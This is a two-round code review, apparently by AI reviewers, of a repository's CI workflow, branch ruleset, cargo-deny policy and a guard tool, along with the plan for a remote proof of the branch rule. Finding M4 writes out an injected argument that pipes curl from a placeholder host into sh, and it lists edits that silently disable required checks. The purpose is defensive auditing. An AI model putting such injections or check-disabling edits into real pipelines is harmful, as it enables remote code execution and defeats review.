# Review, main (scope 002, standards and tooling), 2026-11-14

**Reviewed by**: `claude-fable-5-2` for the code, scripts, CI files and tests (author on `claude-opus-5-5`), and `claude-opus-5-5` for spec 0002, the ADR and the documents (author on `claude-fable-5-2`). Each part was read by the model that did not write it.
**Scope**: 53 files in the range `18e9228..9e03aa7` on `main`, read with `git diff 18e9228..9e03aa7 -- <path>`. Left out on purpose: `docs/scope/`, `graphify-out/`, `.claude/`, `CHANGELOG.md`, the nested `CLAUDE.md` files, and every spec 0001 commit except `48f4a8c`.
**Verdict**: Approve with nits, after the fix round at `ee8e750` (see "Second review"). The first pass at `9e03aa7` ended with Blocked: one blocker and five major findings.

## Second review, fix round at `ee8e750`

**Scope**: the range `9e03aa7..ee8e750` on `main`, 16 files, with the same paths left out as in the first pass. Spec text by `claude-fable-5-2` (`d189413`), read by `claude-opus-5-5`. Code, scripts and tests by `claude-opus-5-5` (`aef4e5e`, `85cfe01`, `d2fa165`, `6e90b60`, `9424fed`, `edc9fc6`, `523ec37`, `3a8aa80`, `da86c6d`, `a251c9f`, `dc4ac71`), read by `claude-fable-5-2`. The main reviewer is the session that wrote the first pass.
**Verdict**: Approve with nits. No blocker and no major finding is open. B1 and M1 to M5 are closed. Fifteen new minor findings came out of this round, none of which can harm the remote. Four things are worth doing before remote step 1, and they are listed under "Before the remote steps".

The rest of this file below "Summary" is the first review as written. Read each finding there together with its state here.

### How this round was run

- Three reviewers in parallel: `claude-opus-5-5` on the spec text, with the whole new "Remote proof" read command by command as text that will be run as written, and two `claude-fable-5-2` reviewers, one on `tools/repo-check/` and one on the scripts and `deny.toml`.
- Every input of the first pass was run again with the program built from the fixed tree. The main reviewer ran its own W5 and CI probes again and two of the new ones.
- Proof cases 24 to 28 ran in the real `scripts/prove-checks.sh` with a stub `cargo`. Cases 22 and 23 were replayed with the real `cargo-deny` offline. Cases 1 to 21 and a full run with builds were not run in this review.
- Live facts were read from GitHub with GET calls only: no ruleset exists, the remote `main` is `6de6970`, the local `main` descends from it, merge commits are allowed.
- `.github/`, `crates/pool-config/fuzz/` and the root `Cargo.toml` did not change in the range.

### State of the first pass findings

| Finding | State | Where | Evidence |
|---|---|---|---|
| B1 | Closed | `docs/specs/0002-standards-and-tooling/index.md:958` | The probe is now an empty commit made with `git commit-tree` on top of a freshly fetched `origin/main`. It belongs to no pull request and has no check run. The block pushes only if GitHub reports exactly the four rule types and the seven names; an empty or failed `gh` answer cannot pass that gate. See r2-m2 and r2-m3 for two small gaps. |
| M1 | Closed | `index.md:897`, `:938` | The branch is pushed and checked in step 1. The rule is applied in step 3, only after seven passes. Nothing in steps 1 and 2 writes to `main`. |
| M2 | Closed | `index.md:1046` | Step 7 is the closing pull request from `scope/002-closing`, with its content listed. The last `git pull --ff-only` works, because the merge commit has the local `main` as a parent. The closing pull request needs no evidence of its own run, so nothing circles. |
| M3 | Closed | `tools/repo-check/src/text.rs:42`, `src/workspace.rs:293` | Reproduced: a header with a comment, a quoted key, a target table, `package = "pool"` and a rename through `[workspace.dependencies]` all give `W5: ... pool-config -> pool is not allowed`. See r2-m9 and r2-m10 for forms that are still missed. |
| M4 | Closed | `tools/repo-check/src/ci.rs:183` | Reproduced: `continue-on-error`, `if:`, `shell:`, `container:`, a job level `env:`, `name:`, a matrix, the `;curl` run, the `|| true` line, and quoted, flow style and spaced `run` keys all give C3. Rule C3 is now an allowed list of keys. See r2-m6 to r2-m8 for what it still does not hold. |
| M5 | Closed | `tools/repo-check/src/ids.rs:258`, `src/tree.rs:130` | Reproduced: a missing blob and a non UTF-8 owner file at the base give `cannot read the base revision`, exit 3. A root that is not the top of its work tree and `HEAD:docs` give exit 3. A removed ID still gives D6, a clean tree gives `ok`. |
| m1 | Closed | `index.md:913`, `:1013`, `:1031` | A bounded wait loop replaces `gh pr checks --watch`, `git branch -D` is gone, the push run is watched before it is read. |
| m2 | Closed | `index.md:1083` | The undo block sets `R=` and names what stays on the remote. |
| m3 | Open, in work | `docs/specs/0002-standards-and-tooling/verify.md` | The fix range changed all three scripts, `deny.toml` and the rule code after the recorded verify. The verify session is redoing it. This one has to be closed before remote step 1. See also r2-m5. |
| m4 | Closed | `docs/research/technology-evaluation.md:102` | The sentence now points at the list of observed versions. |
| m5 | Closed | `docs/engineering-standards.md:9` | The fuzz package is named as the one exception to the `unsafe_code` rule. |
| m6 | Open, on purpose | `AGENTS.md:3`, `:8` | Left to the sync step. It belongs in the closing pull request, because once the rule is active the root guide must name the pull request path. |
| m7 | Closed | `scripts/linux-build.sh:11` | Reproduced under `sh` and `dash`: a failing `git`, a folder that is not a repository, a failing `git status` and a dirty tree all exit 3. |
| m8 | Closed | `scripts/check.sh:179` | Reproduced: a stub `cargo` that writes both files and exits 1 leaves a clean tree and exit 1. |
| m9 | Closed in part | `scripts/check.sh:27`, `scripts/linux-build.sh:5`, `scripts/prove-checks.sh:27`, `:303` | All three scripts stay in their root, and `prove-checks.sh` ignores `GIT_DIR`, hooks and signing. One place is left, see r2-m13. |
| m10 | Closed | `deny.toml:8` | `unsound = "all"`, accepted by `cargo-deny` 0.20.2, the same in the spec block. |
| m11 | Closed as scoped | `scripts/prove-checks.sh:327` | Cases 22 to 28 each fail for the named rule. Four policy parts stay without a case, as the spec now says. See r2-m14. |
| m12 | Closed | `tools/repo-check/src/tree.rs:133` | A revision that starts with a hyphen gives `is not a commit`, exit 3. |
| m13 | Closed | `tools/repo-check/src/text.rs:59` | All four comment inputs now pass. |
| m14 | Open, on purpose | spec Follow-up 10 | Fine to leave. Two members today, W1 shows a new name, and the decision is due before a third crate. |
| m15 | Open, on purpose | spec "Known limits of the guards" | Fine to leave. |
| m16 | Closed in part | `tools/repo-check/src/ci.rs:346` | A blank line and an indented comment are caught. A comment in the first column is not, see r2-m6. |
| m17 | Closed in part, as the spec now says | `tools/repo-check/src/ci.rs` | A second workflow file, `secrets['X']`, `toJSON(secrets)`, a job without `runs-on:` and a missing `permissions:` block are refused. The `on:` block and the fields of `main.json` still pass and are listed under "Known limits of the guards". |
| m18, m19 | Open, on purpose | spec "Known limits of the guards" | Fine to leave. |
| m20, m21 | Open, on purpose | `tools/repo-check/tests/repo_check/check_script.rs` | Fine to leave. The new branches in `linux-build.sh` and `check_sbom` belong on the same list. |
| m22 | Closed in the main | `tools/repo-check/tests/repo_check/` | Eight of the nine "Gap" tests were turned into real refusals. The symbolic link one stays as a written limit. |
| m23 | Open, on purpose | same | Fine to leave. One cheap item is in r2-m12. |

### The new "Remote proof", step by step

The Opus reviewer read every block, every "Expected" sentence, every failure path and the cleanup. No command was found that can still leave the remote in a state the spec does not intend. In short:

- **Step 1** (push the scope branch, open the pull request, wait): fine. The wait loop is bounded and finds the run by the head commit.
- **Step 2** (read the Linux build lines): fine.
- **Step 3** (apply the rule): fine. A second ruleset cannot be created, because the block posts only when none exists.
- **Step 4** (the probe): correct in the normal case. A refused push changes nothing. An accepted push lands one empty commit, and the text handles that case and tells the lead to stop and report.
- **Step 4, cleanup**: the forced push command is written correctly, and the lease moves `main` back only if it is still the probe commit. The text asks for the owner's approval first. See r2-m4: leaving the empty commit is the safer path and should come first.
- **Step 5** (the failing pull request): fine. It fails on `fmt` and on `clippy`, which the text says.
- **Step 6** (merge): fine. `gh pr merge --merge` agrees with the allowed merge method, and nothing asks for an approval.
- **Step 7** (the closing pull request): works as written.
- **Step 8** and the undo: fine.

### New findings of this round

All are minor. Owners are in brackets.

### 🟡 r2-m1. The condition before step 1 cannot be met word for word, `docs/specs/0002-standards-and-tooling/index.md:895` (also `:1258`) [spec owner]
**Problem**: The text asks that both check scripts pass "on exactly the revision that step 1 pushes", and that the checker records that revision in `verify.md` first. Recording it is a commit, so the pushed revision always differs from the checked one.
**Why it matters**: It is unclear text, not a risk. Step 1 runs all seven checks on the pushed revision on GitHub, and nothing reaches `main` before step 3. The Opus reviewer first rated this major and then lowered it to minor for that reason.
**Suggested fix**: Name two revisions. The checks pass on X. Step 1 pushes Y. `git diff --stat X Y` lists only `verify.md` and `graphify-out/`. Until the spec says so, you can run step 1 with that reading, as long as the output of that command goes into the record. The sentence can be fixed in the closing pull request.

### 🟡 r2-m2. The probe gate does not look at the bypass list, `index.md:962`, `:940`, `:1289` [spec owner]
**Problem**: The gate checks rule types and check names. It does not check `bypass_actors` or whether the signed in owner can bypass. Step 3 prints neither, although "Known limits of the guards" says its output "shows what GitHub really holds".
**Why it matters**: If `main.json` ever carried a bypass actor (the guards do not read that field), the probe would land on `main`. Today the file has an empty list, so this is not live.
**Suggested fix**: In step 3, also print the bypass count and `current_user_can_bypass` of the new ruleset and expect `0 never`. Add the same to the gate of step 4.

### 🟡 r2-m3. An empty `PROBE` or `BEFORE` turns a push into a delete request, `index.md:967`, `:985` [spec owner]
**Problem**: If `git commit-tree` fails, `PROBE` is empty and the refspec `:refs/heads/main` asks GitHub to delete `main`. GitHub refuses that for a default branch, the block prints `push refused`, and both `git ls-remote` lines are equal. Every "Expected" sentence then holds although no commit was pushed. The cleanup block has the same shape with `BEFORE`.
**Why it matters**: The remote stays safe. But `0002 AC-13` could be recorded as passed by mistake.
**Suggested fix**: Write `"${PROBE:?}"` and `"${BEFORE:?}"`. Until then, count step 4 as passed only if the `probe` line shows a full hash and the refusal does not speak of deleting a branch.

### 🟡 r2-m4. The cleanup of step 4 offers the forced push first, `index.md:982` [spec owner]
**Problem**: The text gives the forced push first and "leave the empty commit" only as a fallback. The ruleset is never removed, so `non_fast_forward` will almost surely refuse the forced push anyway. The leave path makes a merge commit without the graph update that `AGENTS.md` asks for, with no written exemption, and after it step 2 has to be read again on the new run.
**Why it matters**: An empty commit on `main` breaks nothing. The scope pull request falls behind, and the merge and the rerun of step 1 that the text already gives bring it up to date. A forced push to a public default branch is the riskier act.
**Suggested fix**: Offer "leave it" as the default and the forced push as an option that needs the owner. Say that the spec never removes the ruleset to clean up.

### 🟡 r2-m5. `verify.md` still uses the old step numbers, `docs/specs/0002-standards-and-tooling/verify.md:350`, `:412`, `:544`, `:574`, and `rationale.md:206` [verify session, spec owner]
**Problem**: `verify.md` maps `AC-3` to remote steps 2 and 6 (now 1 and 6), `AC-5` to step 3 (now 2), `AC-13` to steps 1 and 4 (now 3 and 4), and says 21 proof cases (now 28). The rationale says no other file names these numbers.
**Suggested fix**: Renumber the four pending rows while the verify is redone, and correct the rationale sentence.

### 🟡 r2-m6. C5 still accepts a permission after a comment in the first column, `tools/repo-check/src/ci.rs:346`, spec `index.md:422` [`dev-f2-audit`]
**Problem**: `permissions:`, `  contents: read`, a line `# note` in the first column, then `  packages: write` gives `pool-repo-check ci: ok`. YAML reads two permissions. This is the comment input of m16, and the fix commit names m16 as closed.
**Evidence**: Reproduced by the code reviewer and again by the main reviewer.
**Suggested fix**: End the block only at a line that starts in the first column and is not a comment. Change the spec sentence the same way and add the case to the test.

### 🟡 r2-m7. Nothing before `jobs:` is held, and the spec does not list that, `tools/repo-check/src/ci.rs:162`, spec `index.md:443`, `:1289` [`dev-f2-audit`, spec owner]
**Problem**: C3 starts at the `jobs:` line. A workflow level `defaults:` with `run:` and `shell:`, `BASH_ENV` in the top `env:`, and a changed `POOL_CHECK_BASE` all pass. The first makes every `run:` step succeed, the last makes D6 compare the tree with itself. The spec says C3 reports every key that can change whether or how a step runs.
**Evidence**: Reproduced by the code reviewer, and by the main reviewer for `defaults:`. Both reviewers found it on their own.
**Suggested fix**: Allow only the top level keys `name`, `on`, `permissions`, `concurrency`, `env` and `jobs`, or compare the lines before `jobs:` with the spec block. At the least, add these inputs to "Known limits of the guards".

### 🟡 r2-m8. C3 reads keys without their place, `tools/repo-check/src/ci.rs:133`, `:215`, `:256` [`dev-f2-audit`]
**Problem**: Four inputs pass: `run:` written as an input under `with:` (the job then has no run step), a `- run:` line inside a block of text, a whole extra job in flow style on one line, and a lone carriage return that hides a second key.
**Why it matters**: All four need intent, and three are easy to see in a diff. The honest one line edits of M4 are all caught.
**Evidence**: Reproduced, `ci: ok` for each.
**Suggested fix**: Tie each allowed key to its indent in the fixed shape. Follow-up 11 (compare the file with the spec block) closes all of it.

### 🟡 r2-m9. W5 still misses four rare spellings, `tools/repo-check/src/workspace.rs:306`, `:258` [`dev-f2-audit`, spec owner]
**Problem**: An inline `dependencies = { ... }` at the top, a dotted `dependencies.pool` under a `[target...]` header (two forms), and a rename in an inline table over several lines all give `workspace: ok`.
**Why it matters**: Same guard as M3, much rarer forms. Follow-up 10 already holds the decision to read the edges from `Cargo.lock` before a third crate.
**Suggested fix**: Take Follow-up 10 with the slice that adds the third crate, and list the four forms under "Known limits of the guards" until then.

### 🟡 r2-m10. A member written in single quotes is not checked at all, `tools/repo-check/src/workspace.rs:164`, `:219`, `:183` [`dev-f2-audit`]
**Problem**: The fix reads both kinds of TOML quotes for comments, keys and `package` values. The `members` array, the package name and the value of `unsafe_code` still know only double quotes. A member `'crates/extra'` with no `[lints]` table and a forbidden dependency gives `workspace: ok`.
**Why it matters**: W1 still shows the new name in the lockfile baseline. It should be fixed before the slice that adds a third crate.
**Suggested fix**: Read the three values with the shared helper and add a test.

### 🟡 r2-m11. Two additions to W5 are right but not in the spec, and one is applied too widely, `tools/repo-check/src/workspace.rs:398`, spec `index.md:408` [`dev-f2-audit`, spec owner]
**Problem**: A rename in the root `[workspace.dependencies]` is followed, which matches Cargo. But the code uses it for every member key of that name, also when the member line does not say `workspace = true`, which gives a false alarm. A quoted key may hold a dot, which is how TOML reads it and can cause neither a miss nor a false alarm. The spec says neither.
**Suggested fix**: Two sentences in the spec, and apply the root rename only when the member's dependency holds `workspace = true`.

### 🟡 r2-m12. Closed holes that no test holds closed, `tools/repo-check/tests/repo_check/docs.rs:619`, `tools/repo-check/src/ci.rs:605`, `:651` [`tst-f2-test`]
**Problem**: Five branches of the fixes have no test: a base that names a subtree (`HEAD:docs`), a workflow with no `jobs:` line, a workflow with no `permissions:` block, the first column comment of r2-m6, and the forbidden direction through a root rename.
**Why it matters**: The first one closed a road of M5. Its fix can be undone with no red test.
**Suggested fix**: One short case for each.

### 🟡 r2-m13. `check.sh fuzz` still follows an exported `CDPATH`, `scripts/check.sh:164` [`dev-f2-build`]
**Problem**: The fuzz command runs `cd crates/pool-config` in a child shell that still has the exported `CDPATH`. Reproduced: the command ran in another folder and the script printed `== ok: fuzz`.
**Why it matters**: `fuzz` is not a required check, so CI is not affected.
**Suggested fix**: `unset CDPATH` after line 27, as `prove-checks.sh` does.

### 🟡 r2-m14. Proof case 22 leaves a clone in the Cargo home on every run, `scripts/prove-checks.sh:341` [`dev-f2-audit`]
**Problem**: Case 22 adds a Git source from a `file://` path. Cargo keeps `git/db/prove-source-<hash>` and `git/checkouts/prove-source-<hash>` (about 76 KB) in `~/.cargo/git` each time. Five pairs are already there. A file inside stores the local path.
**Why it matters**: No build is affected and nothing leaves the machine. It only grows.
**Suggested fix**: A cleanup line after the restore and in the exit trap. Do not point `CARGO_HOME` at the temporary folder, because the `deny` run would then download every crate again.

### 🟡 r2-m15. `unsound = "all"` has no proving case and is not on the list of unproven parts, spec `index.md:889`, `:1295` [spec owner]
**Problem**: Case 6 uses a vulnerability advisory, so it does not cover the new key. The spec lists four policy parts without a case, and this is a fifth.
**Suggested fix**: Add it to the list, or add a case with a made up unsound advisory on an indirect dependency.

### Nits of this round

- ⚪ `scripts/linux-build.sh:11`, outside a repository the script prints Git's `fatal` line and its own line, where the contract says one line. Change the wording of the spec, not the script: Git's line carries the cause, and `0002 AC-1` names only a missing tool and a stopped daemon, which still print one line.
- ⚪ `docs/specs/0002-standards-and-tooling/index.md:1020`, "Expected" names `git status --short`, but the block runs `git status -sb | head -1`, which hides changed files.
- ⚪ `index.md:1069`, step 7 merges without the `mergeStateStatus` line that step 6 prints first.
- ⚪ `index.md:985`, `:1088`, two blocks hold a placeholder in angle brackets. Pasted whole they fail without harm. One line "edit the placeholder first" would help.
- ⚪ `index.md:974`, the `else` branch of the gate does not say what to do next.
- ⚪ `index.md:978`, "an object that nothing points to" is true only when the push is refused.
- ⚪ `index.md:887`, "Cases 22 and 23 contact no host" does not hold for the `deny` run that follows them. Reasoned.
- ⚪ `index.md:446` with `:1107`, the way out for later slices names a new key or a new workflow file, not a new `run:` text, which the planned `fuzz` job will need. The planned `integration` job passes the rules as written (tried on a copy).
- ⚪ `index.md:1289`, "Known limits of the guards" does not say that any action pinned by a hash passes C1 and C3.
- ⚪ `tools/repo-check/src/ci.rs:240`, a comment line between two steps gives two problems, and the first one points the wrong way.
- ⚪ `tools/repo-check/src/ci.rs:178`, jobs indented by four spaces give 27 problems that all say "before the first job". One message would tell the reader what to do.
- ⚪ `tools/repo-check/src/ci.rs:220`, the message "not on the allowed list of rule C3" does not say where the list is.
- ⚪ `tools/repo-check/src/ci.rs:93`, the text `secrets` is matched with exact case, so `SECRETS.X` passes.
- ⚪ `tools/repo-check/src/workspace.rs:272` and `src/text.rs:60`, a backslash escape inside a string can hide a rename. No honest manifest has this.
- ⚪ `tools/repo-check/src/workspace.rs:310`, false alarms on rare valid input (a `[package.metadata.dependencies.pool]` table, `lints.workspace = true` as a dotted key). All fail closed.
- ⚪ `tools/repo-check/src/tree.rs:143`, "is not a commit" is also printed for a commit that a shallow clone does not hold.
- ⚪ `tools/repo-check/tests/repo_check/workspace.rs:407`, the W7 message difference is still not marked.
- ⚪ `scripts/prove-checks.sh:45`, the trap for `INT` and `TERM` still does not exit. `:153`, the wanted text is still searched anywhere in the output. `:38`, a failing `git` ends with exit 128, not 3.
- ⚪ `scripts/check.sh:182`, a failed `sbom` run leaves an older `target/sbom/pool.cdx.json` in place.

### Before the remote steps

No finding blocks the remote proof. These four are small and worth doing first, in this order of weight:

1. **m3**: let the verify session finish on the tree that step 1 will push, with `scripts/check.sh all` and `scripts/prove-checks.sh`, and with the step numbers and counts of r2-m5.
2. **r2-m1**: run `git diff --stat X Y` and keep its output, so the condition before step 1 is shown to hold.
3. **r2-m3**: in step 4, check that the `probe` line shows a full hash before you count a refusal as a pass.
4. **r2-m4**: if the probe ever lands, prefer leaving the empty commit. A forced push to `main` needs the owner's word either way.

r2-m6 is a one line fix and r2-m7 is at least one sentence in the spec. Both can go into the closing pull request. Everything else can wait for the slice that adds a third crate or the next job.

### What is good in the fix round

- The new remote proof is written to be run. Every wait is bounded, every block sets its own variables, and each write has a gate or a stated reason.
- Rule C3 as an allowed list is the right shape. It closes keys nobody listed, such as `needs:` and `services:`, and the spec says who extends the list.
- M5 is fixed at the root. Absent and unreadable are kept apart in one helper, and a test guards against turning an absent file into a fault.
- Eight "Gap" tests became real refusals, and proof cases 24 to 26 now prove C3, C4 and C5.
- No regression was found. The committed tree, the good inputs of the first pass and the planned `integration` job all pass, and the scripts give the same exit statuses under `sh` and `dash`.
- The limits that stay are written down in the spec with a follow up each.

## Summary

Scope 002 installs seven required checks behind one entry point (`scripts/check.sh`), a GitHub Actions workflow on an ARM runner, a branch rule kept as a file, a strict `cargo-deny` policy, a fuzz target, and a small program (`pool-repo-check`) that guards the workspace, the CI files and the documents. The work is careful. Every file under `.github/` and both build scripts equal their blocks in spec 0002 byte for byte, the branch rule payload is well formed, and its seven check names equal the seven job ids, so nothing in it can lock `main` for good.

The headline issue is in the part that has not run yet. Remote step 4 pushes the one commit that GitHub is likely to accept on a direct push, so the step meant to prove a refusal can instead move the public `main`. Two more findings are about the order and the ending of the remote proof. The other three are places where a guard passes although the thing it protects is broken: rule W5 on a dependency table with a comment on its header, the CI guard on `continue-on-error` and `if:`, and rule D6 when the base revision cannot be read.

You may want to fix the blocker and the two remote proof findings in the spec before the lead runs any remote step. The three guard findings can go to the two developer sessions in parallel.

## How this review was run

- Four reviewers ran in parallel, each on its own slice, each writing its findings before any developer was asked anything.
  - Part A, `claude-fable-5-2`: `.github/`, `scripts/check.sh`, `scripts/linux-build.sh`, `deny.toml`, `Cargo.toml`, `crates/pool-config/fuzz/`.
  - Part B, `claude-fable-5-2`: `tools/repo-check/` (manifest, baselines, source) and `scripts/prove-checks.sh`.
  - Part C, `claude-fable-5-2`: `tools/repo-check/tests/`.
  - Part D, `claude-opus-5-5`: spec 0002 (`index.md`, `rationale.md`, `verify.md`), ADR 0002, the standards and index documents, the three `AGENTS.md` files, and commit `48f4a8c` of spec 0001.
- The main reviewer (`claude-fable-5-2`) merged the four parts, reproduced the W5 and CI guard findings again with the built program on copies of the tree, and read the code behind the D6 finding.
- For the two major findings on spec text, the severity is the one the Opus reviewer gave. The main reviewer is the same model as the spec author, so it added facts in a note and did not lower the rating.
- "Reproduced" below means: a copy of the committed tree was changed in a scratch folder and `pool-repo-check` was run on it with `--root`, or a script fragment was run with stub tools. "Reasoned" means read from the code or the text only.
- Live facts were read from GitHub with GET calls only. Nothing was written to GitHub.
- Line numbers refer to the tree at `9e03aa7`.
- After the range, `main` gained `0e68e2a` (a fix in `tools/repo-check/src/tree.rs` for `--base`). It is not part of this review. Where it changes the state of a finding, the finding says so.

## Blockers

### 🔴 B1. Remote step 4 may be accepted by GitHub and move `main`, `docs/specs/0002-standards-and-tooling/index.md:860` with `.github/rulesets/main.json:22`

**Problem**: Step 4 runs `git push origin main:main` after step 2 passed, and expects a refusal with `GH013`. At that moment the commit being pushed is exactly the head of the open pull request `scope/002-standards-and-tooling`. It is a fast forward of the remote `main`, so "up to date" holds. All seven required checks have reported success on that very commit from the Actions app. The pull request rule asks for 0 approvals. GitHub accepts a direct push of a pull request head when that pull request meets the rules of the branch, and this pull request meets all of them. So the push can go through.

**Why it matters**: If it goes through, four things happen that the spec does not intend, on a public branch, and they cannot be taken back while `non_fast_forward` is active.
- `main` moves by fast forward with no merge commit, although the spec says only a merge commit is allowed.
- GitHub marks the scope pull request as merged, so remote step 6 cannot run as written.
- `0002 AC-13` ("a direct push is refused") is recorded as failed although the rule works as GitHub designed it.
- The proof of a refusal is still missing and needs a second attempt.

The content that would land did pass all seven checks, so nothing unsafe reaches `main`. It is rated a blocker because the brief for this review sets that bar for a command that leaves the remote in a state the spec did not intend, and because the lead will run the step as written.

**Evidence**: Reasoned from the payload, the step text and GitHub's page on the rules available for rulesets. Not reproduced, because that needs a write to GitHub. No source was found that states the outcome for a ruleset with 0 approvals in so many words, so this is a likely outcome, not a certain one. That uncertainty is itself the problem: the step is an experiment whose bad branch cannot be undone.

**Suggested fix**: In the spec, change the probe so that it pushes a commit that belongs to no pull request and has no check runs. Two ways that keep both outcomes clean:
- An empty commit on top of `origin/main`, made with `git commit-tree` from the tree of `origin/main`, pushed to `refs/heads/main`. An active rule refuses it. If the rule were not active, only an empty commit lands.
- Or the first commit after `origin/main` on the way to the local `main`. An active rule refuses it. If the rule were not active, `main` moves forward by one commit of this scope, and the scope pull request stays open and valid.

Keep the two `git ls-remote` lines. Add a gate: run step 4 only if step 1 printed exactly the four rule types and the seven names. Add one sentence that "merge commit only" binds the merge button and the API, and may not bind a direct push of a green pull request head while 0 approvals are required.

## Major

### 🟠 M1. The branch rule goes live before any check has run on a GitHub runner, `docs/specs/0002-standards-and-tooling/index.md:826` (also `:1070`)

**Problem**: Remote step 1 creates an active ruleset with no bypass actor and seven required checks. Only step 2 runs the workflow on GitHub for the first time. The remote `main` (`6de6970`) has no `.github/` folder today, and nothing has ever reported `fmt` to `docs` from `ubuntu-24.04-arm`. The spec itself says at line 651 that `rustup toolchain install` with no name "is not yet seen on the runner".

**Why it matters**: A first run on a new runner often fails for a reason outside the code. From step 1 on, every such surprise happens with the rule already active.

**Evidence**: Reasoned from the text, plus live reads (`rulesets` prints `[]`, `branches/main/protection` gives 404, the contents API gives 404 for `.github` on `main`).

**Note from the main reviewer**: A pull request runs the workflow file of its own branch, so a broken job can be fixed on the scope branch and pushed again, as step 2 already says. The owner can also delete the ruleset. So `main` is not locked for good. The risk is a confusing first day, not a lost branch.

**Suggested fix**: Change the order at no cost: step 2 (push the branch, open the pull request, see seven green checks), step 3, then step 1 (apply the rule), then steps 4, 5 and 6. The scope branch stays up to date with `main`, so the strict policy still lets step 6 merge. Update Build plan step 11 to match.

### 🟠 M2. The steps after the merge are not written down, `docs/specs/0002-standards-and-tooling/index.md:714` (also `:1070`, `:1114`)

**Problem**: `0002 AC-3` asks that the run address and the commit hash are recorded in `verify.md` and linked from scope 002. Those values exist only after steps 2 and 6. Once the rule is active they can reach `main` only through a second pull request. Step 11 says "the checker records the addresses" and "then apply item 12 in the next pull request". It does not list what goes into that pull request: the evidence in `verify.md`, the scope 002 status, item 12, the closing entry of the coordination log, and the graph update. Follow-up 9 tells the lead to follow this spec and not step 9 of the coordination skill, but that skill step pushes `main` again, and the spec gives no replacement for it.

**Why it matters**: Run as written, the closing either tries `git push origin main` (refused, harmless, but the closing stops) or leaves the evidence for `AC-3` off `main`.

**Evidence**: Checked by the Opus reviewer against `.claude/skills/coordinate/SKILL.md`, read only.

**Note from the main reviewer**: The general path at lines 714 to 720 does cover any later change (a branch, a pull request, seven checks, a merge commit). What is missing is the explicit closing step for this scope.

**Suggested fix**: Add one remote step before the daily run step: on a new branch from the updated `main`, commit the addresses in `verify.md`, the scope 002 row and heading, item 12, the coordination log and the graph update, push it, open a pull request, wait for seven checks, merge with `--merge`, then `git pull --ff-only`. Name the branch pattern for it.

### 🟠 M3. Rule W5 misses a forbidden dependency in four ordinary TOML spellings, `tools/repo-check/src/text.rs:42` and `tools/repo-check/src/workspace.rs:235`

**Problem**: `table_header` accepts a header only when the trimmed line ends with `]`. A header with a comment, `[dependencies] # runtime`, is not seen as a header, so every key under it is counted under the table before it and W5 never sees those dependencies. Three more spellings are missed: a quoted key (`"pool" = { path = ... }`), a table per dependency under a target (`[target.'cfg(unix)'.dependencies.pool]`), and a renamed dependency (`app = { package = "pool", path = ... }`).

**Why it matters**: W5 is the only automatic guard for the rule that core and control never depend on each other. Crates that must have no internal dependency at all (`pool-config`, later `pool-protocol`) are not saved by the "listed but missing" half of the rule. Today the harm is small, because the workspace has two members. It becomes real with the first slice that adds `pool-core` or `pool-control`.

**Evidence**: Reproduced by Part B for all four, and again by the main reviewer for the header comment. In `crates/pool-config/Cargo.toml` of a copy, `[dependencies] # runtime` followed by `pool = { path = "../../apps/pool" }` gives `pool-repo-check workspace: ok`. The same line under a plain header gives `W5: ... dependency pool-config -> pool is not allowed`. The rename is pinned as a passing test marked "Gap" at `tools/repo-check/tests/repo_check/workspace.rs:273`.

**Suggested fix**: Cut a trailing comment before the header test, strip quotes from a key, accept `<anything>.<dependency table>.<key>` as a table per dependency, and read `package = "..."` when a line has one. A fuller option for the spec owner: take the edges from the root `Cargo.lock`, which names the real package whatever the manifest spelling. Turn the "Gap" test into a failing case. The same comment helper also fixes finding m13.

### 🟠 M4. A required check can be switched off and `pool-repo-check ci` still passes, `tools/repo-check/src/ci.rs:163`

**Problem**: Rule C3 reads only `run:` lines. Two groups of input pass.
1. Keys that C3 does not read at all: `continue-on-error: true` on a job or a step, `if: false` on a step, `if:` on a job, `shell:` with a command template, `container:`, and a job level `env:` (for example `BASH_ENV`).
2. Places where the code is weaker than the rule's own sentence. The `<name>` in `scripts/check.sh <name>` is any text without white space (`ci.rs:173` to `176`), so `scripts/check.sh tools;curl${IFS}-s${IFS}https://example.invalid|sh` is accepted for a run that is not the last one of its job. A YAML continuation line is ignored: `- run: scripts/check.sh fmt` followed by a deeper line `|| true` is one command to YAML, and C3 sees only the first line.

**Why it matters**: With `continue-on-error: true` a step fails and the job still reports success. With `if: false` the step never runs and the job reports success. Either is one line that an honest person might add to quiet a flaky job, and `guards` stays green. The spec says C3 "is what keeps CI free of logic of its own". The code keeps the letter of the rule and not that purpose. One limit applies: a pull request can also change the guard itself, so these rules protect against honest drift and help the reviewer, they do not stop intent.

**Evidence**: Reproduced by Part B for every item. Reproduced again by the main reviewer with three changes in one copy of `ci.yml` (`continue-on-error: true` on job `deny`, `if: false` on the `test` step, a `|| true` continuation line under the `fmt` run): `pool-repo-check ci: ok`.

**Suggested fix**: Enforce the fixed shape the spec already claims. Smallest step: report any line under `jobs:` whose key is not in a short allowed list (`runs-on`, `timeout-minutes`, `steps`, `uses`, `with`, `persist-credentials`, `fetch-depth`, `path`, `key`, `run`), report a line that is deeper than a `run:` line and follows it, and require `<name>` to be one of the known check names. The fullest option: a rule in the style of W7 that compares `ci.yml` and `main.json` with their code blocks in spec 0002, which also closes m16 and m17. Group 1 changes the wording of rule C3, so the spec owner has to agree first. Add failing tests, and turn the test `c3_does_not_read_the_shell_key` around.

### 🟠 M5. Rule D6 passes when the base revision cannot be read, `tools/repo-check/src/ids.rs:401` and `tools/repo-check/src/tree.rs:128`

**Problem**: Three roads led to "the base defines nothing, so nothing is gone" in the reviewed range.
1. A failed `git show` is swallowed. The base is read with `required = false`, which goes through `tree.read(path).ok().flatten()` (`ids.rs:160`, `ids.rs:253`). An error becomes "the file does not exist". The loop at `ids.rs:403` that copies faults can never run. The spec gives exit 3 when `git` failed for `--base`.
2. `git ls-tree` ran without `--full-tree`, and Git looks upward for a repository. A `--root` that the enclosing repository does not track got an empty listing and exit 0.
3. A base that names a subtree (`HEAD:docs`) was accepted.

**Why it matters**: D6 guards stable requirement IDs (`0002 AC-10`). It reported "ok" without having compared anything, which is the unsafe direction. The CI path was never affected by roads 2 and 3, because `scripts/check.sh` runs from the repository top and the `docs` job fetches the full history. A base that does not resolve fails closed (exit 3 in a shallow clone).

**Evidence**: Reproduced by Part B with an ID defined at the base and removed in the tree: exit 1 at the repository top, exit 0 on each of the three roads.

**State after the range**: `0e68e2a` on `main` closes roads 2 and 3 (the root must be the top of its work tree, the revision is resolved to a commit first, `--full-tree` is passed) and the option problem in m12. Road 1 is still open: `ids.rs` is unchanged, so a read error at the base is still treated as a missing file. The test added there covers the root check only.

